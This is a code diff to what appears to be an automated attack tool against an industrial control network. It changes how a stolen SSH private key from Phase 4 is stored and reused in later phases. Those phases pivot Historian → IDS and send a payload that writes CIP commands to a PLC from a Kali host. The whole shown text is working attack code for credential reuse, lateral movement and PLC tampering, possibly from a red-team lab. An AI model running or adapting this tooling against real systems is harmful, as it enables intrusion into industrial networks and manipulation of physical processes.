@@ -873,10 +873,11 @@ def phase4_ssh_pivot() -> PhaseResult:
                     info(f"Trying stolen key as {ku}@{ids_ip}")
                     ids_client = ssh_hop(hist_client, ids_ip, ids_port,
                                          ku, pkey=stolen_pkey)
-                    # Update CFG so later phases use the right user
+                    # Persist key + user in CFG so Phases 5 & 6 can reuse them
                     if ku != ids_user:
                         CFG["ids"]["username"] = ku
-                    CFG["ids"]["password"] = ""   # key auth — no password needed
+                    CFG["ids"]["password"]    = ""           # not needed — key auth
+                    CFG["ids"]["private_key"] = stolen_pkey  # paramiko.PKey object
                     console.print(Panel(
                         f"[bold white]Method   :[/bold white] [bold green]Stolen SSH Private Key[/bold green]\n"
                         f"[bold white]Username :[/bold white] [bold yellow]{ku}[/bold yellow]\n"
@@ -1090,7 +1091,12 @@ def phase5_plc_attack() -> PhaseResult:
                                   password=hist_pass, port=hist_port)
 
         info(f"Hopping Historian → IDS ({ids_ip})...")
-        ids_client = ssh_hop(hist_client, ids_ip, ids_port, ids_user, ids_pass)
+        ids_pkey   = CFG["ids"].get("private_key")   # set by Phase 4 if key was stolen
+        ids_client = ssh_hop(
+            hist_client, ids_ip, ids_port, ids_user,
+            target_pass=None if ids_pkey else ids_pass,
+            pkey=ids_pkey,
+        )
 
         ok(f"CIP Write path: Kali → Historian ({hist_ip}) → IDS ({ids_ip}) → PLC ({plc_ip})")
         stdout, stderr, _ = ssh_run(ids_client, payload, timeout=30)
@@ -1145,7 +1151,12 @@ def phase6_defense_check() -> PhaseResult:
     try:
         hist_client = ssh_connect(hostname=hist_ip, username=hist_user,
                                   password=hist_pass, port=hist_port)
-        ids_client  = ssh_hop(hist_client, ids_ip, ids_port, ids_user, ids_pass)
+        ids_pkey    = CFG["ids"].get("private_key")   # set by Phase 4 if key was stolen
+        ids_client  = ssh_hop(
+            hist_client, ids_ip, ids_port, ids_user,
+            target_pass=None if ids_pkey else ids_pass,
+            pkey=ids_pkey,
+        )
 
         stdout, _, _ = ssh_run(ids_client, ids_cmd)
         ids_client.close()
